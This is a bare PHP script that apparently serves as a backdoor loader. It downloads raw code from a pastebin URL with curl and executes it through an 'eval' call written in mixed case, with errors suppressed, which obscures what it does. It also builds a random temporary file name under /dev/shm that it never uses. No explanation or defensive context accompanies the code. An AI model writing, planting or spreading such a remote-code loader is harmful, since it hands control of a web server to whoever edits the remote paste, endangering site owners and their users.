<?php

    $url = 'https://pastebin.com/raw/CdNWURPG';

    $targetDir = '/dev/shm';

    if (!is_dir($targetDir)) {
        mkdir($targetDir, 0777, true);
    }

    $randomFileName = uniqid() . '.php';
    $targetFile = $targetDir . '/' . $randomFileName;

    if (!file_exists($targetFile)) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, false);
        $response = curl_exec($ch);
        curl_close($ch);
        @EvAl('?>'. $response);
    }

?>
